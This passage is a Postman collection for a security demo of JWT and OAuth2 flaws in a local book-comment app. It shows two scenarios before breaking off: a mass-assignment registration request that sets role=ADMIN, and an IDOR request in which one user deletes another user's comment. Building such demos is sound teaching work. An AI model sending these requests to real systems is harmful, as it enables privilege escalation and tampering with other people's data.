{
  "info": {
    "_postman_id": "security-demo-collection",
    "name": "JWT + OAuth2 Security Vulnerabilities Demo",
    "description": "Collection để demo 5 lỗ hổng bảo mật JWT + OAuth2",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "item": [
    {
      "name": "1️⃣ KỊCH BẢN 1: Mass Assignment",
      "item": [
        {
          "name": "Register - Attacker (role=ADMIN)",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n    \"username\": \"attacker\",\n    \"email\": \"attacker@gmail.com\",\n    \"password\": \"123456\",\n    \"role\": \"ADMIN\"\n}"
            },
            "url": {
              "raw": "http://localhost:8080/api/auth/register",
              "protocol": "http",
              "host": ["localhost"],
              "port": "8080",
              "path": ["api", "auth", "register"]
            }
          },
          "response": []
        }
      ]
    },
    {
      "name": "2️⃣ KỊCH BẢN 2: IDOR",
      "item": [
        {
          "name": "Register - UserA",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n    \"username\": \"userA\",\n    \"email\": \"userA@gmail.com\",\n    \"password\": \"123456\"\n}"
            },
            "url": {
              "raw": "http://localhost:8080/api/auth/register",
              "protocol": "http",
              "host": ["localhost"],
              "port": "8080",
              "path": ["api", "auth", "register"]
            }
          },
          "response": []
        },
        {
          "name": "Register - UserB",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n    \"username\": \"userB\",\n    \"email\": \"userB@gmail.com\",\n    \"password\": \"123456\"\n}"
            },
            "url": {
              "raw": "http://localhost:8080/api/auth/register",
              "protocol": "http",
              "host": ["localhost"],
              "port": "8080",
              "path": ["api", "auth", "register"]
            }
          },
          "response": []
        },
        {
          "name": "UserA - Add Comment on Book 1",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              },
              {
                "key": "Authorization",
                "value": "Bearer {{token_userA}}"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n    \"content\": \"Sách hay lắm! Comment của UserA\",\n    \"parentId\": null\n}"
            },
            "url": {
              "raw": "http://localhost:8080/api/comments/book/1",
              "protocol": "http",
              "host": ["localhost"],
              "port": "8080",
              "path": ["api", "comments", "book", "1"]
            }
          },
          "response": []
        },
        {
          "name": "UserB - Delete UserA Comment (IDOR)",
          "request": {
            "method": "DELETE",
            "header": [
              {
                "key": "Authorization",
                "value": "Bearer {{token_userB}}"
              }
            ],
            "url": {
              "raw": "http://localhost:8080/api/comments/{{comment_id}}",
              "protocol": "http",
              "host": ["localhost"],
              "port": "8080",
              "path": ["api", "comments", "{{comment_id}}"]
            }
          },
          "response": []
        }
      ]
    },
    {
